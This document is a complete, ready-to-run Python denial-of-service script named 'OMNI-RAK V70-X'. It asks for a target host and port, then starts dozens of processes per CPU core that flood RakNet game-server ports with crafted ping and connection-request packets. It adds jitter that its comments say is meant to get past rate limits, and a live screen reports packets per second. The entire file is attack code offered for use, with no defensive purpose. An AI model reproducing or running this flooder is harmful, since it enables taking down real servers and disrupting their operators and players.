#!/usr/bin/env python3
# OMNI-RAK V70-X - MAXIMUM DEADLIER | SIMPLE TARGETS | ULTRA FAST

import socket, multiprocessing as mp, os, random, struct, sys, time, signal

BANNER = """\033[1;31m
╔══════════════════════════════════════════════════════════════════╗
║  ██████╗  █████╗ ██╗  ██╗    ██╗   ██╗██████╗                     ║
║  ██╔══██╗██╔══██╗██║ ██╔╝    ██║   ██║╚════██╗                    ║
║  ██████╔╝███████║█████╔╝     ██║   ██║ █████╔╝                    ║
║  ██╔══██╗██╔══██║██╔═██╗     ╚██╗ ██╔╝██╔═══╝                     ║
║  ██║  ██║██║  ██║██║  ██╗     ╚████╔╝ ███████╗                    ║
║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝                    ║
║                                                                  ║
║         OMNI-RAK V70-X | MAX DEADLIER | 0.14.3→0.15.10           ║
║         METHOD: SESSION EXHAUSTION | BYPASS: AGGRESSIVE JITTER    ║
╚══════════════════════════════════════════════════════════════════╝\033[0m"""

signal.signal(signal.SIGINT, lambda x,y: sys.exit(0))

# ========== ALL PROTOCOLS 0.14.3 TO 0.15.10 ==========
ALL_PROTOCOLS = []
for maj,min in [(0,14),(0,15)]:
    for patch in range(0, 16):
        if maj==0 and min==14 and patch>=3:
            ALL_PROTOCOLS.append(struct.pack('!BBB', maj, min, patch))
        elif maj==0 and min==15 and patch<=10:
            ALL_PROTOCOLS.append(struct.pack('!BBB', maj, min, patch))

# ========== DEADLIER PAYLOADS ==========
MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"

PAYLOADS = [
    b"\x01" + os.urandom(4) + MAGIC,           # Unconnected Ping (smaller=faster)
    b"\x05" + MAGIC + b"\x0b",                 # Open Connection 1
    b"\x07" + MAGIC + b"\x00\x00",             # Open Connection 2 (smaller)
    b"\x01" + os.urandom(2) + MAGIC + random.choice(ALL_PROTOCOLS),  # Versioned Ping
    b"\x05" + MAGIC + random.choice(ALL_PROTOCOLS) + b"\x0b",        # Versioned Open
    b"\x13" + os.urandom(32),                  # Connection Request (small)
]

def worker(target_ip, target_port, counter, byte_counter):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 536870912)  # 512MB buffer
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Pre-build payload chunks for speed
        port_range = list(range(19132, 30001))

        while True:
            # 90% target port / 10% scatter
            if random.random() < 0.90:
                dest = target_port
            else:
                dest = port_range[random.randint(0, len(port_range)-1)]

            # Faster payload selection
            p = PAYLOADS[random.randint(0, len(PAYLOADS)-1)]

            # Add minimal random padding (just enough to vary size)
            data = p + os.urandom(random.randint(32, 256))

            try:
                s.sendto(data, (target_ip, dest))
                counter.value += 1
                byte_counter.value += len(data)

                # More aggressive jitter (bypasses rate limits better)
                if counter.value % 50 == 0:
                    time.sleep(0.0005)  # 0.5ms - faster than original

            except:
                pass

def monitor(ip, dw, port, counter, byte_counter, start):
    last_pps = 0
    while True:
        time.sleep(0.8)
        elapsed = time.time() - start
        if elapsed < 1: continue

        pps = int(counter.value / elapsed)
        mbps = (byte_counter.value * 8 / elapsed) / 1024 / 1024

        if pps != last_pps:
            last_pps = pps
            os.system('clear')
            print(BANNER)
            print(f" \033[1;30mTARGET: {ip} | DWORD: {dw} | PORT: {port}\033[0m")
            print(f" \033[1;34mMODE  : RAKLIB EXHAUSTION (V70-X)\033[0m")
            print("-" * 55)
            print(f" \033[1;31mPPS      : {pps:>12,}\033[0m")
            print(f" \033[1;32mMBPS     : {mbps:>10.2f} Mbps\033[0m")
            print(f" \033[1;33mPROTOCOLS: {len(ALL_PROTOCOLS)} versions\033[0m")
            print("-" * 55)
            print(f" \033[1;30mWORKERS: {mp.cpu_count()*64} | JITTER: AGGRESSIVE\033[0m")
            print("\033[1;31m[!] MAXIMUM DEADLIER ACTIVE\033[0m")

def main():
    if os.geteuid() != 0:
        print("\033[1;31m[!] SUDO REQUIRED FOR MAX BUFFER\033[0m")
        return

    os.system('clear')
    print(BANNER)

    target = input("\033[1;36mTARGET: \033[0m")
    port = int(input("\033[1;36mPORT: \033[0m"))

    ip = socket.gethostbyname(target)
    dw = struct.unpack("!L", socket.inet_aton(ip))[0]

    print(f"\033[1;32m[✓] {ip} | DWORD: {dw}\033[0m\n")

    counter = mp.Value('q', 0)
    byte_counter = mp.Value('q', 0)
    start = time.time()

    workers = mp.cpu_count() * 64
    for _ in range(workers):
        p = mp.Process(target=worker, args=(ip, port, counter, byte_counter))
        p.daemon = True
        p.start()

    monitor(ip, dw, port, counter, byte_counter, start)

if __name__ == "__main__":
    main()